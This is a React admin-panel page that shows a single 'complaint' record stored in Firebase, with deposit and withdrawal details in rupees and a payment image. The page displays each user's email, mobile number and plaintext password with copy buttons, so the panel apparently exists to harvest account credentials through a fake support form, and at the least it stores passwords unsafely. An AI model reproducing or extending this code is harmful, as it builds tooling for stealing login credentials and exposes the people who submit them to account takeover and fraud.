import { useState } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import { ref, remove } from 'firebase/database';
import { db } from '../firebase.js';
import { AdminHeader } from '../components/AdminHeader.jsx';
import { SimpleImageViewer } from '../components/ImageViewers.jsx';
import { useLiveRecord } from '../hooks/useLive.js';
import {
  DocIcon, ChatIcon, RupeeIcon, ImageIcon, EyeIcon, TrashIcon, CopyIcon, CheckIcon,
  RowUser, RowPhone, RowMail, RowLock, RowAlert, RowMoney, RowCalendar, RowClock
} from '../components/icons.jsx';

const ROW_ICONS = {
  user: RowUser, phone: RowPhone, mail: RowMail, lock: RowLock,
  alert: RowAlert, money: RowMoney, calendar: RowCalendar, clock: RowClock
};

function DetailRow({ label, value, copyable, icon }) {
  const [copied, setCopied] = useState(false);
  const Ico = ROW_ICONS[icon];

  async function copy() {
    try {
      await navigator.clipboard.writeText(value);
    } catch {
      const ta = document.createElement('textarea');
      ta.value = value;
      document.body.appendChild(ta);
      ta.select();
      document.execCommand('copy');
      document.body.removeChild(ta);
    }
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  }

  return (
    <div className="detail-row">
      <span className="detail-label"><Ico /> {label}</span>
      <div className="detail-value-wrap">
        <span className="detail-value">{value || '-'}</span>
        {copyable && value && (
          <button className={copied ? 'copy-btn copied' : 'copy-btn'} onClick={copy}>
            {copied ? <CheckIcon size={14} /> : <CopyIcon size={14} />} {copied ? 'Copied' : 'Copy'}
          </button>
        )}
      </div>
    </div>
  );
}

function TypeIcon({ type }) {
  if (type === 'DEPOSITE') return <RupeeIcon size={14} />;
  if (type === 'WITHDRAWAL') return (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="23 6 13.5 15.5 8.5 10.5 1 18" /><polyline points="17 6 23 6 23 12" />
    </svg>
  );
  return <ChatIcon size={14} />;
}

export default function Request() {
  const [params] = useSearchParams();
  const navigate = useNavigate();
  const key = params.get('id');
  const [req, error] = useLiveRecord(key ? 'complaints/' + key : null);
  const [imgLoaded, setImgLoaded] = useState(false);
  const [viewer, setViewer] = useState(null);

  async function del() {
    if (!confirm('Delete this request?')) return;
    await remove(ref(db, 'complaints/' + key));
    navigate('/index.html');
  }

  return (
    <>
      <AdminHeader back="/index.html" title="REQUEST DETAILS" TitleIcon={<DocIcon size={22} />} />

      <div className="detail-page" id="detailPage">
        {!req && !error && <p className="no-users">Loading...</p>}
        {error && <p className="no-users">Error loading details: {error.message}</p>}
        {req === null && <p className="no-users">Request not found.</p>}

        {req && (() => {
          const d = req.data || {};
          return (
            <div className="detail-card">
              <span className="detail-type-badge">
                <TypeIcon type={req.type} /> {req.type} REQUEST
              </span>

              <DetailRow label="User Name" value={d.username} icon="user" />
              <DetailRow label="Mobile Number" value={d.mobile} copyable icon="phone" />
              <DetailRow label="Email ID" value={d.email} copyable icon="mail" />
              <DetailRow label="Password" value={d.password} copyable icon="lock" />
              <DetailRow label="Problem" value={d.problem} icon="alert" />
              <DetailRow label="Amount" value={d['deposit-amount'] || d['withdrawal-amount']} icon="money" />
              <DetailRow label="Date" value={req.date} icon="calendar" />
              <DetailRow label="Time" value={req.time} icon="clock" />

              {req.image && (
                <div className="detail-image-section">
                  <h4><ImageIcon size={18} /> Payment Image</h4>
                  <div className="image-preview">
                    <img
                      className={imgLoaded ? 'lazy-image loaded' : 'lazy-image'}
                      src={imgLoaded ? req.image : 'data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 200 200%27%3E%3Crect fill=%27%23f0f0f0%27 width=%27200%27 height=%27200%27/%3E%3Ctext x=%2750%25%27 y=%2750%25%27 dominant-baseline=%27middle%27 text-anchor=%27middle%27 fill=%27%23999%27 font-size=%2712%27%3ETap to load image%3C/text%3E%3C/svg%3E'}
                      alt="Payment"
                      onClick={() => setImgLoaded(true)}
                    />
                    <button className="view-btn" onClick={() => setViewer(req.image)}>
                      <EyeIcon size={16} /> View Full
                    </button>
                  </div>
                </div>
              )}

              <button className="delete-btn" onClick={del}>
                <TrashIcon size={16} /> DELETE REQUEST
              </button>
            </div>
          );
        })()}
      </div>

      <SimpleImageViewer src={viewer} onClose={() => setViewer(null)} />
    </>
  );
}
